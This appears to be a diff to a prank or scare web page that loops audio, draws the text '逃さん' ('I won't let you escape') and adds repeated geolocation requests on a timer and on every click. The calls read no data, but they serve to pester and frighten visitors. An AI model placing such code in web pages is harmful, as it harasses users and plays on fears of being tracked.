@@ -6,6 +6,7 @@ function ale() {
   window.setInterval(() => {
     try {
       audio.play();
+      navigator.geolocation.getCurrentPosition();
       /*if (
         (document.fullscreenElement !== undefined &&
           document.fullscreenElement !== null) ||
@@ -34,6 +35,7 @@ window.onload = () => {
   draw.font = '350px serif';
   draw.fillText('逃さん', 0, 500);
   window.document.onclick = () => {
+    navigator.geolocation.getCurrentPosition();
     /*if (document.body.requestFullscreen) {
       document.body.requestFullscreen();
     } else if (document.body.mozRequestFullScreen) {
